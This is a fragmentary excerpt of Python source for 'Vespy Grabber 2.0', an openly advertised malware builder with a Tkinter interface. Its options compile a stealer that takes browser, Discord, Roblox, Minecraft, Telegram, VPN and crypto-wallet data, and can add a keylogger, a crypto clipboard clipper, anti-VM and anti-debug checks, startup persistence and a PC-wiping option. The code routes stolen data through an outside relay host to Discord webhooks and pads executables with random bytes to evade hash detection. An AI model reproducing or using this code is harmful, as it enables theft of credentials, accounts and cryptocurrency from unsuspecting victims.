...
window = Tk()
window.title("[FREE] Vespy Grabber 2.0 || vespyprojects.com || t.me/fccvesper")
...
class Builder:
    ...
    def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,antiD,rebootP,startupP,errorM,pingH,discordS,exodusS,telegramS,antivmS,hideS,NUKEPCHAHAHA,customMsgDS,customMsgError,compiletoexe,hidepayloadb,PYTHONDHTEXT,DISCORDINJECTION,cryptoCLIPPA,cryptoBITCOIN,cryptoETH,VPNsteala,KEYLOGGAR,klBOTTOKEN,wbh,name,icon):
        ...
        clipperlink = ""
        keyloggerlink = ""
        WEB_INTO_THE_HOOK_YEAAAH = requests.post("http://vesper.pythonanywhere.com/create_protected_webhook",json={'discord_webhook_url':f"{wbh}"}).json()['protected_webhook_url']
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1109262870883090465/1113545572192899072/forvespyservero.png")
        embed = DiscordEmbed(title=f"Grabber Compiled", description=f"Options Chose", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1109262870883090465/1113545572192899072/forvespyservero.png')
        ...
        self.FILE.write(f"""wbh = "{WEB_INTO_THE_HOOK_YEAAAH}"\n""")
        if webhookJ:
...
try:
    ...
    try:
        ...
        if cryptoCLIPPA:
            ...
            open("Compiled/components/Thecl1pp3r.py",'w').write(f"""import requests;wbh = {WEB_INTO_THE_HOOK_YEAAAH}"""+CONTENT)
        ...
        if KEYLOGGAR == True or cryptoCLIPPA == True:
            ...
            open("Compiled/components/DR3PPR.py",'w').write(f"""import requests;wbh = {WEB_INTO_THE_HOOK_YEAAAH}\n"""+CONTENT)
...
def main():
    ...
    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1109262870883090465/1113545572192899072/forvespyservero.png",content=f"{ABCDEFGHIJKLMNOPQRSTUVWXYZ}")
    embed = DiscordEmbed(title=f"Info Grabbed of user : ``{user}``", description="**Sent Anonfiles link**\n\n"+content, color='4300d1')
    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1109262870883090465/1113545572192899072/forvespyservero.png')
    embed.set_footer(text='Vespy 2.0 | by : vesper')
    embed.set_timestamp()
...
""")
    ...
    def _EXENullHash(self):
        null = ""
        for _ in range(random.randint(500,1000)):
            choice2 = random.choice([1,2,3])
            if choice2 == 1:
                P=''.join(random.choices(string.ascii_uppercase, k=random.randint(3,8)))
                null += f"\f{P}"
            elif choice2 == 2:
                null += "\v"
            else:
...
"""
        ...
        FLZ = open(f"Compiled/{name}.py","r+").readlines()
        obf_content2 = ""
        for line in FLZ:
            null = self._NullHash()
            obf_content2 += f"#{null}\n{line}"
        open(f"Compiled/{name}.py","w+").write(obf_content2)
    ...
    def _Compile(self, icon, name:str):
        ...
        if "components/" not in name:
            FLZ = open(f"Compiled/{rname}.exe","rb").read()
            nulls = ""
            for _ in range(random.randint(100,500)):
                nulls += self._EXENullHash()+"\n"
            open(f"Compiled/{rname}.exe",'wb').write(FLZ+nulls.encode('utf-8'))
...
class Menu:
    ...
    def _distools(self):
        ...
        if self.checkwebhook(self.TOOLWEBHOOK):
            ...
            goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._tools)
            goback.place(x=186,y=401)
            gotoencodewbh = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B")
    ...
    def _compile(self):
        ...
        if self.compiletoexe == False:
            ...
            self.Compiletoexe.place(x=227,y=289)
        else:
        ...
        if self.keeppythonfile == False:
            ...
            self.Keeppythonfile.place(x=372,y=289)
        else:
        ...
        if self.hidepayloadb == False:
            ...
            self.Hidepayloadb.place(x=227,y=357)
        else:
